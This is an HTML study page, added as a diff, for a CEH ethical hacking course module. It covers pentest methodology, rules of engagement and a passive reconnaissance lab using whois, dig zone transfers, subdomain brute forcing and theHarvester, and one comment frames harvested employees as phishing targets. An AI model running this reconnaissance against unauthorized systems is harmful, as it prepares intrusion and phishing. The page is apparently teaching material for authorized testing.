@@ -1,0 +1,2476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ethical Hacking — CEH Study Module</title>
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:ital,wght@0,300;0,500;0,700;0,900;1,700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:        #0a0a0a;
+  --bg2:       #111111;
+  --bg3:       #161616;
+  --bg4:       #1c1c1c;
+  --border:    #222222;
+  --border2:   #2e2e2e;
+  --text:      #e8e8e8;
+  --text-muted:#888888;
+  --text-dim:  #444444;
+  --red:       #e5191b;
+  --red-dim:   #3a0808;
+  --red-glow:  rgba(229,25,27,0.07);
+  --orange:    #f97316;
+  --orange-dim:#3a1a06;
+  --yellow:    #eab308;
+  --yellow-dim:#3a2e06;
+  --green:     #22c55e;
+  --green-dim: #052a14;
+  --blue:      #3b82f6;
+  --blue-dim:  #0c1e3a;
+  --cyan:      #06b6d4;
+  --cyan-dim:  #042830;
+  --violet:    #a855f7;
+  --violet-dim:#1e0a38;
+  --sidebar-w: 252px;
+}
+
+*{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+
+body{
+  font-family:'Share Tech Mono',monospace;
+  background:var(--bg);
+  color:var(--text);
+  font-size:13px;
+  line-height:1.7;
+  min-height:100vh;
+}
+
+/* animated scanline */
+body::before{
+  content:'';
+  position:fixed;top:0;left:0;right:0;bottom:0;
+  background:repeating-linear-gradient(
+    0deg,transparent,transparent 3px,
+    rgba(229,25,27,0.012) 3px,rgba(229,25,27,0.012) 4px
+  );
+  pointer-events:none;z-index:0;
+}
+
+.layout{display:flex;min-height:100vh;position:relative;z-index:1;}
+
+/* ── SIDEBAR ── */
+.sidebar{
+  width:var(--sidebar-w);flex-shrink:0;
+  background:var(--bg2);
+  border-right:1px solid var(--border);
+  position:sticky;top:0;height:100vh;
+  overflow-y:auto;display:flex;flex-direction:column;
+}
+.sidebar::-webkit-scrollbar{width:3px;}
+.sidebar::-webkit-scrollbar-thumb{background:var(--red-dim);}
+
+.sb-head{
+  padding:22px 18px 16px;
+  border-bottom:1px solid var(--border);
+}
+
+.sb-mark{
+  display:flex;align-items:center;gap:8px;
+  margin-bottom:12px;
+}
+.sb-mark-bar{
+  width:3px;height:28px;background:var(--red);
+  box-shadow:0 0 8px var(--red);
+}
+.sb-title{
+  font-family:'Barlow Condensed',sans-serif;
+  font-size:18px;font-weight:900;
+  color:var(--text);letter-spacing:0.02em;
+  text-transform:uppercase;line-height:1.1;
+}
+.sb-sub{
+  font-size:9px;color:var(--text-dim);
+  letter-spacing:0.08em;text-transform:uppercase;margin-top:5px;
+}
+
+.nav-grp{
+  padding:13px 18px 3px;
+  font-size:8.5px;letter-spacing:0.12em;text-transform:uppercase;
+  color:var(--text-dim);
+}
+
+.nav-item{
+  display:flex;align-items:center;gap:9px;
+  padding:7px 18px;
+  font-size:11px;color:var(--text-muted);
+  cursor:pointer;transition:all 0.12s;
+  text-decoration:none;
+  border-left:2px solid transparent;
+}
+.nav-item:hover{color:var(--text);background:var(--bg3);}
+.nav-item.active{color:var(--red);background:var(--red-glow);border-left-color:var(--red);}
+
+.nav-n{font-size:9px;color:var(--text-dim);min-width:16px;text-align:right;}
+
+.sb-foot{
+  margin-top:auto;padding:14px 18px;
+  border-top:1px solid var(--border);
+}
+.sf-row{
+  display:flex;justify-content:space-between;
+  font-size:9.5px;color:var(--text-dim);margin-bottom:6px;
+}
+.sf-track{height:2px;background:var(--border);border-radius:99px;overflow:hidden;}
+.sf-fill{height:100%;background:var(--red);border-radius:99px;transition:width 0.5s;
+  box-shadow:0 0 6px var(--red);}
+
+/* ── MAIN ── */
+.main{flex:1;overflow-x:hidden;}
+
+/* Hero */
+.hero{
+  padding:50px 62px 40px;
+  border-bottom:1px solid var(--border);
+  background:var(--bg);
+  position:relative;overflow:hidden;
+}
+
+.hero::before{
+  content:'';
+  position:absolute;top:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent,var(--red),transparent);
+}
+
+.hero::after{
+  content:'CEH';
+  position:absolute;right:48px;top:50%;transform:translateY(-50%);
+  font-family:'Barlow Condensed',sans-serif;
+  font-size:200px;font-weight:900;font-style:italic;
+  color:rgba(229,25,27,0.04);
+  pointer-events:none;user-select:none;
+  letter-spacing:-8px;
+}
+
+.hero-tag{
+  display:inline-flex;align-items:center;gap:6px;
+  font-size:9.5px;letter-spacing:0.14em;text-transform:uppercase;
+  color:var(--red);font-weight:500;margin-bottom:14px;
+}
+.hero-tag::before{
+  content:'';width:8px;height:8px;border-radius:50%;
+  background:var(--red);box-shadow:0 0 8px var(--red);
+  animation:blink 1.5s infinite;
+}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:0.2;}}
+
+.hero-title{
+  font-family:'Barlow Condensed',sans-serif;
+  font-size:62px;font-weight:900;
+  color:var(--text);line-height:0.95;
+  text-transform:uppercase;letter-spacing:-0.01em;
+  margin-bottom:16px;
+}
+.hero-title span{
+  color:var(--red);
+  text-shadow:0 0 24px rgba(229,25,27,0.4);
+}
+
+.hero-desc{
+  font-size:12.5px;color:var(--text-muted);
+  max-width:560px;line-height:1.8;margin-bottom:28px;
+}
+
+.hero-warning{
+  display:inline-flex;align-items:flex-start;gap:10px;
+  background:rgba(229,25,27,0.06);
+  border:1px solid var(--red-dim);
+  border-left:3px solid var(--red);
+  border-radius:2px;padding:10px 14px;
+  font-size:11.5px;color:var(--text-muted);
+  max-width:620px;margin-bottom:28px;line-height:1.7;
+}
+.hw-icon{color:var(--red);font-size:14px;flex-shrink:0;margin-top:1px;}
+
+.hero-stats{
+  display:flex;gap:0;
+  border:1px solid var(--border);
+  border-radius:2px;overflow:hidden;
+  display:inline-flex;
+}
+.hs{
+  padding:11px 20px;border-right:1px solid var(--border);
+  display:flex;flex-direction:column;gap:2px;
+}
+.hs:last-child{border-right:none;}
+.hs-v{
+  font-family:'Barlow Condensed',sans-serif;
+  font-size:22px;font-weight:700;color:var(--text);
+  text-transform:uppercase;
+}
+.hs-v.r{color:var(--red);}
+.hs-v.g{color:var(--green);}
+.hs-v.o{color:var(--orange);}
+.hs-l{font-size:9px;color:var(--text-dim);letter-spacing:0.08em;text-transform:uppercase;}
+
+/* Content */
+.content{padding:0 62px 80px;}
+
+/* Section */
+.section{margin-top:52px;animation:rUp 0.3s ease both;}
+@keyframes rUp{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:translateY(0);}}
+
+.sec-head{
+  display:flex;align-items:flex-start;gap:16px;
+  margin-bottom:24px;padding-bottom:16px;
+  border-bottom:1px solid var(--border);
+  position:relative;
+}
+.sec-head::after{
+  content:'';position:absolute;bottom:-1px;left:0;
+  width:44px;height:1px;background:var(--red);
+  box-shadow:0 0 6px rgba(229,25,27,0.5);
+}
+
+.sec-num{
+  font-size:11px;color:var(--text-dim);
+  padding-top:4px;min-width:20px;
+}
+.sec-meta{flex:1;}
+.sec-title{
+  font-family:'Barlow Condensed',sans-serif;
+  font-size:28px;font-weight:900;color:var(--text);
+  text-transform:uppercase;letter-spacing:0.02em;
+  line-height:1.1;margin-bottom:3px;
+}
+.sec-sub{font-size:10.5px;color:var(--text-muted);}
+
+.badge{
+  font-size:8.5px;font-weight:500;letter-spacing:0.1em;
+  text-transform:uppercase;padding:3px 10px;
+  border-radius:1px;flex-shrink:0;margin-top:3px;border:1px solid;
+}
+.b-red{background:var(--red-glow);color:var(--red);border-color:var(--red-dim);}
+.b-orange{background:var(--orange-dim);color:var(--orange);border-color:rgba(249,115,22,0.2);}
+.b-yellow{background:var(--yellow-dim);color:var(--yellow);border-color:rgba(234,179,8,0.2);}
+.b-green{background:var(--green-dim);color:var(--green);border-color:rgba(34,197,94,0.2);}
+.b-blue{background:var(--blue-dim);color:var(--blue);border-color:rgba(59,130,246,0.2);}
+.b-cyan{background:var(--cyan-dim);color:var(--cyan);border-color:rgba(6,182,212,0.2);}
+.b-violet{background:var(--violet-dim);color:var(--violet);border-color:rgba(168,85,247,0.2);}
+
+/* Theory */
+.theory{
+  background:var(--bg2);
+  border:1px solid var(--border);
+  border-left:2px solid var(--red);
+  border-radius:2px;padding:16px 20px;margin-bottom:12px;
+}
+.theory.orange{border-left-color:var(--orange);}
+.theory.yellow{border-left-color:var(--yellow);}
+.theory.green{border-left-color:var(--green);}
+.theory.blue{border-left-color:var(--blue);}
+.theory.cyan{border-left-color:var(--cyan);}
+.theory.violet{border-left-color:var(--violet);}
+
+.theory h4{
+  font-family:'Barlow Condensed',sans-serif;
+  font-size:15px;font-weight:700;color:var(--text);
+  text-transform:uppercase;letter-spacing:0.04em;
+  margin-bottom:8px;
+}
+.theory p{font-size:12.5px;color:var(--text-muted);margin-bottom:7px;line-height:1.8;}
+.theory p:last-child{margin-bottom:0;}
+.theory strong{color:var(--text);font-weight:500;}
+.theory em{color:var(--red);font-style:normal;}
+
+/* Grid */
+.grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(205px,1fr));
+  gap:6px;margin:10px 0;
+}
+.card{
+  background:var(--bg2);border:1px solid var(--border);
+  border-radius:2px;padding:13px 15px;
+  transition:all 0.12s;
+}
+.card:hover{border-color:var(--border2);background:var(--bg3);}
+
+.ck{
+  font-size:9.5px;font-weight:500;letter-spacing:0.07em;
+  text-transform:uppercase;margin-bottom:6px;color:var(--red);
+}
+.ck.o{color:var(--orange);}
+.ck.y{color:var(--yellow);}
+.ck.g{color:var(--green);}
+.ck.b{color:var(--blue);}
+.ck.c{color:var(--cyan);}
+.ck.v{color:var(--violet);}
+.cv{font-size:12px;color:var(--text-muted);line-height:1.65;}
+
+/* Table */
+.dtable{width:100%;border-collapse:collapse;margin:12px 0;font-size:12px;}
+.dtable th{
+  text-align:left;padding:8px 12px;
+  background:var(--red);color:#fff;
+  font-size:8.5px;text-transform:uppercase;letter-spacing:0.1em;font-weight:500;
+}
+.dtable td{
+  padding:8px 12px;border-bottom:1px solid var(--border);
+  color:var(--text-muted);vertical-align:top;
+}
+.dtable tr:last-child td{border-bottom:none;}
+.dtable tr:hover td{background:var(--bg3);color:var(--text);}
+.dtable tbody tr:nth-child(even) td{background:var(--bg2);}
+
+.tk{color:var(--text);font-weight:500;}
+.tr{color:var(--red);font-weight:500;}
+.to{color:var(--orange);font-weight:500;}
+.ty{color:var(--yellow);font-weight:500;}
+.tg{color:var(--green);font-weight:500;}
+.tb{color:var(--blue);font-weight:500;}
+.tc{color:var(--cyan);font-weight:500;}
+
+/* Phase boxes */
+.phase-flow{
+  display:flex;gap:4px;margin:12px 0;flex-wrap:wrap;
+}
+.pf-step{
+  flex:1;min-width:90px;
+  background:var(--bg2);border:1px solid var(--border);
+  border-radius:2px;padding:12px 12px 10px;
+  transition:all 0.12s;cursor:default;
+}
+.pf-step:hover{border-color:var(--red-dim);background:var(--bg3);}
+.pf-step.active{border-color:var(--red);background:var(--red-glow);}
+.pf-num{font-size:9px;color:var(--text-dim);margin-bottom:4px;}
+.pf-name{
+  font-family:'Barlow Condensed',sans-serif;
+  font-size:14px;font-weight:700;color:var(--text);
+  text-transform:uppercase;margin-bottom:3px;
+}
+.pf-desc{font-size:10.5px;color:var(--text-muted);line-height:1.5;}
+
+/* Practical block */
+.practical{
+  border:1px solid var(--border);border-radius:2px;
+  overflow:hidden;margin-bottom:12px;
+}
+.prac-head{
+  background:var(--bg3);padding:10px 16px;
+  display:flex;align-items:center;gap:10px;
+  border-bottom:1px solid var(--border);
+  cursor:pointer;user-select:none;transition:background 0.12s;
+}
+.prac-head:hover{background:rgba(229,25,27,0.04);}
+.ph-i{font-size:13px;}
+.ph-t{font-size:12px;font-weight:500;color:var(--text);flex:1;
+  font-family:'Barlow Condensed',sans-serif;
+  text-transform:uppercase;letter-spacing:0.04em;font-size:13.5px;}
+.ph-tag{
+  font-size:8.5px;font-weight:500;text-transform:uppercase;
+  letter-spacing:0.08em;padding:2px 8px;border-radius:1px;border:1px solid;
+}
+.pt-lab{background:var(--red-glow);color:var(--red);border-color:var(--red-dim);}
+.pt-cmd{background:var(--cyan-dim);color:var(--cyan);border-color:rgba(6,182,212,0.2);}
+.pt-tool{background:var(--orange-dim);color:var(--orange);border-color:rgba(249,115,22,0.2);}
+.pt-report{background:var(--green-dim);color:var(--green);border-color:rgba(34,197,94,0.2);}
+.pt-theory{background:var(--violet-dim);color:var(--violet);border-color:rgba(168,85,247,0.2);}
+
+.ph-chev{font-size:9px;color:var(--text-dim);transition:transform 0.2s;}
+.practical.open .ph-chev{transform:rotate(90deg);}
+.prac-body{display:none;padding:16px 20px;background:var(--bg);}
+.practical.open .prac-body{display:block;}
+
+/* Steps */
+.steps{list-style:none;}
+.step{display:flex;gap:14px;margin-bottom:16px;padding-bottom:16px;border-bottom:1px dashed var(--border);}
+.step:last-child{margin-bottom:0;padding-bottom:0;border-bottom:none;}
+.sn{
+  width:22px;height:22px;border-radius:2px;
+  background:var(--red-glow);border:1px solid var(--red-dim);
+  display:flex;align-items:center;justify-content:center;
+  font-size:9.5px;font-weight:500;color:var(--red);
+  flex-shrink:0;margin-top:1px;
+}
+.sc{flex:1;}
+.st{font-size:13px;font-weight:500;color:var(--text);margin-bottom:4px;
+  font-family:'Barlow Condensed',sans-serif;
+  text-transform:uppercase;letter-spacing:0.03em;font-size:14px;}
+.sd{font-size:12px;color:var(--text-muted);line-height:1.75;margin-bottom:7px;}
+.sd:last-child{margin-bottom:0;}
+
+/* Code block */
+.code{
+  background:#000000;
+  border:1px solid var(--border);
+  border-left:2px solid var(--red-dim);
+  border-radius:2px;padding:13px 16px;
+  font-size:11.5px;color:#6b7280;
+  overflow-x:auto;margin:7px 0;
+  position:relative;line-height:1.8;
+}
+.code .cm{color:#2d2d2d;}
+.code .cmd{color:var(--green);}
+.code .flag{color:var(--yellow);}
+.code .val{color:var(--cyan);}
+.code .kw{color:var(--violet);}
+.code .hi{color:var(--red);}
+.code .ok{color:var(--green);}
+.code .warn{color:var(--orange);}
+.code .out{color:#444;}
+.code::before{
+  content:attr(data-label);
+  position:absolute;top:6px;right:10px;
+  font-size:8.5px;color:var(--text-dim);
+  letter-spacing:0.08em;text-transform:uppercase;
+}
+
+/* Notes */
+.note{
+  display:flex;gap:10px;align-items:flex-start;
+  border-radius:2px;padding:10px 14px;
+  font-size:12px;margin:9px 0;line-height:1.75;
+}
+.note.red{background:var(--red-glow);border:1px solid var(--red-dim);color:var(--text-muted);}
+.note.orange{background:var(--orange-dim);border:1px solid rgba(249,115,22,0.15);color:var(--text-muted);}
+.note.green{background:var(--green-dim);border:1px solid rgba(34,197,94,0.15);color:var(--text-muted);}
+.note.blue{background:var(--blue-dim);border:1px solid rgba(59,130,246,0.15);color:var(--text-muted);}
+.note.yellow{background:var(--yellow-dim);border:1px solid rgba(234,179,8,0.15);color:var(--text-muted);}
+.note.cyan{background:var(--cyan-dim);border:1px solid rgba(6,182,212,0.15);color:var(--text-muted);}
+.note .ni{font-size:13px;flex-shrink:0;margin-top:1px;}
+.note strong{color:var(--text);}
+
+/* divider */
+.hdiv{border:none;border-top:1px solid var(--border);margin:42px 0 0;}
+
+/* checklist */
+.checklist{list-style:none;}
+.checklist li{
+  display:flex;align-items:flex-start;gap:10px;
+  padding:5px 8px;border-radius:2px;
+  font-size:12px;color:var(--text-muted);cursor:pointer;transition:background 0.1s;
+}
+.checklist li:hover{background:var(--bg2);color:var(--text);}
+.cb{
+  width:13px;height:13px;border:1px solid var(--border2);
+  border-radius:1px;flex-shrink:0;margin-top:3px;
+  display:flex;align-items:center;justify-content:center;transition:all 0.14s;
+}
+.checklist li.done .cb{background:var(--green);border-color:var(--green);}
+.checklist li.done .cb::after{content:'✓';font-size:8.5px;color:#000;font-weight:bold;}
+.checklist li.done span:last-child{text-decoration:line-through;color:var(--text-dim);}
+
+/* tool chip */
+.tool-row{display:flex;flex-wrap:wrap;gap:5px;margin:10px 0;}
+.tool-chip{
+  background:var(--bg3);border:1px solid var(--border);
+  border-radius:2px;padding:5px 10px;
+  font-size:11px;color:var(--text-muted);
+  display:flex;align-items:center;gap:5px;
+  transition:all 0.12s;cursor:default;
+}
+.tool-chip:hover{border-color:var(--red-dim);color:var(--text);}
+.tool-chip .ti{font-size:12px;}
+
+/* CVE / vuln highlight */
+.cve{
+  display:inline-block;
+  background:var(--red-glow);border:1px solid var(--red-dim);
+  color:var(--red);border-radius:1px;
+  padding:0 5px;font-size:10px;font-weight:500;
+  margin:0 2px;vertical-align:middle;
+}
+
+/* attack chain */
+.chain{
+  display:flex;align-items:stretch;
+  gap:0;margin:12px 0;overflow-x:auto;
+}
+.chain-step{
+  flex:1;min-width:80px;
+  background:var(--bg2);
+  border:1px solid var(--border);
+  border-right:none;
+  padding:10px 10px 8px;
+  position:relative;
+}
+.chain-step:last-child{border-right:1px solid var(--border);}
+.chain-step.hit{border-color:var(--red-dim);background:var(--red-glow);}
+.cs-n{font-size:9px;color:var(--text-dim);margin-bottom:3px;}
+.cs-t{
+  font-family:'Barlow Condensed',sans-serif;
+  font-size:13px;font-weight:700;color:var(--text);
+  text-transform:uppercase;
+}
+.cs-d{font-size:10.5px;color:var(--text-muted);margin-top:3px;line-height:1.4;}
+
+/* OWASP item */
+.owasp-list{list-style:none;margin:10px 0;}
+.owasp-item{
+  display:flex;align-items:flex-start;gap:12px;
+  padding:10px 12px;border:1px solid var(--border);
+  border-radius:2px;margin-bottom:5px;
+  background:var(--bg2);transition:all 0.12s;
+  cursor:default;
+}
+.owasp-item:hover{border-color:var(--border2);background:var(--bg3);}
+.oi-rank{
+  font-family:'Barlow Condensed',sans-serif;
+  font-size:18px;font-weight:900;color:var(--red);
+  min-width:34px;text-align:center;line-height:1;
+  opacity:0.5;
+}
+.oi-body{flex:1;}
+.oi-name{font-size:13px;font-weight:500;color:var(--text);margin-bottom:3px;}
+.oi-desc{font-size:11.5px;color:var(--text-muted);line-height:1.6;}
+.oi-tag{
+  font-size:9px;padding:2px 6px;border-radius:1px;
+  display:inline-block;margin-top:4px;
+  border:1px solid;
+}
+
+/* scrollbar */
+::-webkit-scrollbar{width:5px;height:5px;}
+::-webkit-scrollbar-track{background:transparent;}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px;}
+
+@media(max-width:900px){
+  .sidebar{display:none;}
+  .hero,.content{padding-left:20px;padding-right:20px;}
+  .hero-title{font-size:42px;}
+  .hero::after{display:none;}
+  .grid{grid-template-columns:1fr 1fr;}
+  .phase-flow{flex-direction:column;}
+  .chain{flex-direction:column;}
+  .chain-step{border-right:1px solid var(--border);border-bottom:none;}
+  .chain-step:last-child{border-bottom:1px solid var(--border);}
+}
+</style>
+</head>
+<body>
+<div class="layout">
+
+<!-- SIDEBAR -->
+<nav class="sidebar">
+  <div class="sb-head">
+    <div class="sb-mark">
+      <div class="sb-mark-bar"></div>
+      <div>
+        <div class="sb-title">Ethical<br>Hacking</div>
+      </div>
+    </div>
+    <div class="sb-sub">CEH Track · Module 05 · Week 5–6</div>
+  </div>
+
+  <div class="nav-grp">Methodology</div>
+  <a class="nav-item active" href="#s1"><span class="nav-n">01</span>CEH Phases & Ethics</a>
+  <a class="nav-item" href="#s2"><span class="nav-n">02</span>Reconnaissance</a>
+  <a class="nav-item" href="#s3"><span class="nav-n">03</span>Scanning & Enumeration</a>
+
+  <div class="nav-grp">Exploitation</div>
+  <a class="nav-item" href="#s4"><span class="nav-n">04</span>System Hacking</a>
+  <a class="nav-item" href="#s5"><span class="nav-n">05</span>Password Attacks</a>
+  <a class="nav-item" href="#s6"><span class="nav-n">06</span>Metasploit Framework</a>
+  <a class="nav-item" href="#s7"><span class="nav-n">07</span>Web App Hacking</a>
+  <a class="nav-item" href="#s8"><span class="nav-n">08</span>Privilege Escalation</a>
+
+  <div class="nav-grp">Post-Exploitation</div>
+  <a class="nav-item" href="#s9"><span class="nav-n">09</span>Persistence & Backdoors</a>
+  <a class="nav-item" href="#s10"><span class="nav-n">10</span>Lateral Movement</a>
+  <a class="nav-item" href="#s11"><span class="nav-n">11</span>Social Engineering</a>
+
+  <div class="nav-grp">Evasion & Report</div>
+  <a class="nav-item" href="#s12"><span class="nav-n">12</span>AV Evasion & Covering Tracks</a>
+  <a class="nav-item" href="#s13"><span class="nav-n">13</span>VAPT Report Writing</a>
+
+  <div class="sb-foot">
+    <div class="sf-row"><span>Progress</span><span id="sb-pct">0%</span></div>
+    <div class="sf-track"><div class="sf-fill" id="sb-fill" style="width:0%"></div></div>
+  </div>
+</nav>
+
+<!-- MAIN -->
+<main class="main">
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-tag">Module 05 · CEH v13 Track</div>
+  <h1 class="hero-title">Ethical<br><span>Hacking</span></h1>
+  <p class="hero-desc">Complete hands-on CEH curriculum — recon to report. Each topic pairs concise theory with real lab commands against your local practice environment. All techniques are for authorized testing only.</p>
+
+  <div class="hero-warning">
+    <span class="hw-icon">⚠</span>
+    <span><strong>Legal Notice:</strong> All techniques in this module must only be applied against systems you own or have explicit written authorization to test. Unauthorized access is a criminal offense under IT Act 2000 Section 66 (India), Computer Fraud and Abuse Act (US), and equivalent laws globally. Your lab environment (DVWA, Metasploitable, VMs you control) is the only valid target.</span>
+  </div>
+
+  <div class="hero-stats">
+    <div class="hs"><span class="hs-v">13</span><span class="hs-l">Topics</span></div>
+    <div class="hs"><span class="hs-v r">12+</span><span class="hs-l">Labs</span></div>
+    <div class="hs"><span class="hs-v g">CEH v13</span><span class="hs-l">Aligned</span></div>
+    <div class="hs"><span class="hs-v o">Week 5–6</span><span class="hs-l">Timeline</span></div>
+  </div>
+</div>
+
+<div class="content">
+
+<!-- ══════════════════
+01 — CEH Phases & Ethics
+══════════════════ -->
+<div class="section" id="s1">
+  <div class="sec-head">
+    <span class="sec-num">01</span>
+    <div class="sec-meta">
+      <div class="sec-title">CEH Phases & Ethics</div>
+      <div class="sec-sub">The hacking methodology, legal framework, and pen test engagement model</div>
+    </div>
+    <span class="badge b-red">Foundation</span>
+  </div>
+
+  <div class="theory">
+    <h4>What Is Ethical Hacking?</h4>
+    <p><strong>Ethical hacking</strong> (penetration testing) is the authorized simulation of real-world attack techniques against a target system to discover vulnerabilities before malicious actors do. The key word is <em>authorized</em> — a written "Rules of Engagement" document signed by both parties is mandatory before any testing begins.</p>
+    <p>CEH (Certified Ethical Hacker) by EC-Council is the most recognized entry-level ethical hacking certification globally and in India. It covers a broad range of attack techniques across 20 modules, mapped to CEH's 5-phase methodology.</p>
+  </div>
+
+  <div class="phase-flow">
+    <div class="pf-step active">
+      <div class="pf-num">Phase 1</div>
+      <div class="pf-name">Reconnaissance</div>
+      <div class="pf-desc">Passive + active information gathering about the target without direct interaction.</div>
+    </div>
+    <div class="pf-step">
+      <div class="pf-num">Phase 2</div>
+      <div class="pf-name">Scanning</div>
+      <div class="pf-desc">Active probing — port scanning, OS detection, vulnerability discovery.</div>
+    </div>
+    <div class="pf-step">
+      <div class="pf-num">Phase 3</div>
+      <div class="pf-name">Enumeration</div>
+      <div class="pf-desc">Extract detailed info — usernames, shares, services, OS version, banners.</div>
+    </div>
+    <div class="pf-step">
+      <div class="pf-num">Phase 4</div>
+      <div class="pf-name">Exploitation</div>
+      <div class="pf-desc">Exploit identified vulnerabilities to gain unauthorized access to the system.</div>
+    </div>
+    <div class="pf-step">
+      <div class="pf-num">Phase 5</div>
+      <div class="pf-name">Post-Exploitation</div>
+      <div class="pf-desc">Maintain access, escalate privileges, pivot, exfiltrate, cover tracks.</div>
+    </div>
+  </div>
+
+  <div class="theory orange" style="margin-top:14px;">
+    <h4>Types of Penetration Tests</h4>
+    <p><strong>Black Box:</strong> No prior knowledge of target. Most realistic — simulates an external attacker. Longest engagement; highest cost.</p>
+    <p><strong>White Box:</strong> Full knowledge — source code, architecture docs, credentials. Most thorough; finds deepest vulnerabilities. Used for code reviews + internal audits.</p>
+    <p><strong>Grey Box:</strong> Partial knowledge (network diagrams, some credentials). Balances realism with efficiency. Most common in commercial pen testing.</p>
+    <p><strong>Red Team:</strong> Full adversarial simulation over weeks/months — physical access, social engineering, persistence. Tests detection and response capabilities, not just vulnerabilities.</p>
+  </div>
+
+  <div class="grid">
+    <div class="card">
+      <div class="ck">Rules of Engagement</div>
+      <div class="cv">Written authorization specifying: scope (IPs, domains), excluded systems, testing hours, emergency contacts, data handling, legal liability. Required before any testing.</div>
+    </div>
+    <div class="card">
+      <div class="ck o">Scope Definition</div>
+      <div class="cv">Exactly which systems are in scope (IP ranges, domains, applications). Systems OUT of scope must never be touched — even if discovered during testing.</div>
+    </div>
+    <div class="card">
+      <div class="ck g">NDA & Confidentiality</div>
+      <div class="cv">Pen testers sign NDAs — findings cannot be disclosed externally. All sensitive data discovered during testing must be deleted after report delivery.</div>
+    </div>
+    <div class="card">
+      <div class="ck b">Hacker Types</div>
+      <div class="cv"><strong>Black hat</strong> — criminal. <strong>White hat</strong> — authorized ethical hacker. <strong>Grey hat</strong> — unauthorized but reports findings. <strong>Script kiddie</strong> — uses tools without understanding. <strong>Hacktivist</strong> — ideological motive.</div>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+02 — Reconnaissance
+══════════════════ -->
+<div class="section" id="s2">
+  <div class="sec-head">
+    <span class="sec-num">02</span>
+    <div class="sec-meta">
+      <div class="sec-title">Reconnaissance — OSINT & Footprinting</div>
+      <div class="sec-sub">Passive and active information gathering before touching the target</div>
+    </div>
+    <span class="badge b-orange">Phase 1</span>
+  </div>
+
+  <div class="theory orange">
+    <h4>Why Reconnaissance Matters Most</h4>
+    <p>Real attackers spend <strong>60–70% of their time in reconnaissance</strong>. The more you know about a target before attacking, the more surgical and effective the attack. Every piece of information gathered — employee names, email formats, technology stack, open ports from Shodan — reduces the attack surface you need to brute-force.</p>
+    <p><em>Passive recon</em> leaves no trace on the target (WHOIS, Google, LinkedIn). <em>Active recon</em> directly interacts with the target (DNS queries, port scanning) and may show up in logs.</p>
+  </div>
+
+  <div class="theory" style="margin-top:10px;">
+    <h4>Passive Reconnaissance Techniques</h4>
+  </div>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">🔍</span>
+      <span class="ph-t">Lab 2.1 — Full Passive Recon on a Target Domain</span>
+      <span class="ph-tag pt-tool">OSINT</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <div class="note red"><span class="ni">⚠</span><span><strong>Practice target:</strong> Use <code style="color:var(--cyan)">testphp.vulnweb.com</code> (legally provided for testing by Acunetix) or a domain you own. Never run active recon against targets without authorization.</span></div>
+      <ol class="steps" style="margin-top:14px;">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">WHOIS — Domain Registration & Registrant Info</div>
+            <div class="code" data-label="bash">
+<span class="cmd">whois</span> testphp.vulnweb.com
+<span class="cm"># Record: Registrar, Registered/Expires date, Registrant email/org</span>
+<span class="cm"># Registrant email → pivot to other domains they own</span>
+<span class="cm"># Registration date → domain age (new domains = phishing; old = established)</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">DNS Enumeration — Map the Target's DNS Infrastructure</div>
+            <div class="code" data-label="bash">
+<span class="cm"># Basic DNS records</span>
+<span class="cmd">dig</span> testphp.vulnweb.com <span class="flag">+short</span>              <span class="cm"># A record</span>
+<span class="cmd">dig</span> testphp.vulnweb.com MX <span class="flag">+short</span>          <span class="cm"># Mail server</span>
+<span class="cmd">dig</span> testphp.vulnweb.com NS <span class="flag">+short</span>          <span class="cm"># Name servers</span>
+<span class="cmd">dig</span> testphp.vulnweb.com TXT <span class="flag">+short</span>         <span class="cm"># SPF, DMARC, verification records</span>
+<span class="cmd">dig</span> testphp.vulnweb.com AAAA <span class="flag">+short</span>        <span class="cm"># IPv6 address</span>
+
+<span class="cm"># Attempt zone transfer (often blocked but reveals misconfigured DNS)</span>
+<span class="cmd">dig</span> axfr @ns1.vulnweb.com vulnweb.com
+<span class="cm"># If successful: full list of all subdomains — gold mine for pen tester</span>
+
+<span class="cm"># Reverse DNS lookup</span>
+<span class="cmd">dig</span> <span class="flag">-x</span> 176.28.50.165 <span class="flag">+short</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">Subdomain Enumeration with Sublist3r & FFUF</div>
+            <div class="code" data-label="bash">
+<span class="cm"># Sublist3r — OSINT-based subdomain discovery</span>
+<span class="cmd">pip3 install</span> sublist3r <span class="flag">--break-system-packages</span>
+<span class="cmd">sublist3r</span> <span class="flag">-d</span> vulnweb.com <span class="flag">-o</span> subdomains.txt
+
+<span class="cm"># FFUF — DNS brute force (only on authorized targets)</span>
+<span class="cmd">ffuf</span> <span class="flag">-w</span> /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+     <span class="flag">-u</span> https://FUZZ.vulnweb.com <span class="flag">-v</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">4</span>
+          <div class="sc">
+            <div class="st">theHarvester — Email, Employee & Subdomain Discovery</div>
+            <div class="code" data-label="bash">
+<span class="cm"># Harvest emails, names, IPs from OSINT sources</span>
+<span class="cmd">theHarvester</span> <span class="flag">-d</span> vulnweb.com <span class="flag">-b</span> google,bing,linkedin,certspotter <span class="flag">-l</span> 200
+<span class="cm"># -d: target domain</span>
+<span class="cm"># -b: sources (google/bing for indexed pages, linkedin for staff)</span>
+<span class="cm"># Output: email addresses, employee names (LinkedIn), subdomains</span>
+
+<span class="cm"># LinkedIn gives: employee names → guess email format → phishing targets</span>
